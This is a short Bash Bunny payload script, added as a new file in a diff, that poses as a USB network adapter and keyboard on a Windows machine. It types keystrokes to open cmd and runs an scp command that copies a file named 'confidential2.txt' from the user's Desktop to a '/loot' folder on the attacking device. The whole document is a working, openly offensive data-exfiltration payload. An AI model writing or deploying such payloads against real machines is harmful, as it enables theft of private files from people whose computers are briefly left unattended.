@@ -1,0 +1,31 @@
+#!/bin/bash
+# Title: RNDIS + HID SCP File Transfer
+# Author: Miazga
+# Description: Opens Windows CMD, runs SCP to Bash Bunny, and enters password.
+
+# Set attack modes
+ATTACKMODE RNDIS_ETHERNET HID
+
+# Give Windows time to initialize network and HID
+LED SETUP
+sleep 10
+
+# Open Windows Run dialog
+QUACK GUI r
+sleep 1
+
+# Type "cmd" and press Enter
+QUACK STRING cmd
+QUACK ENTER
+sleep 1
+
+# Type the SCP command
+QUACK STRING scp -P 22 "C:\Users\barto\Desktop\test\confidential2.txt" root@172.16.64.1:/loot
+QUACK ENTER
+sleep 2
+
+# Enter password
+QUACK STRING YOUR_PASSWORD
+QUACK ENTER
+
+LED FINISH
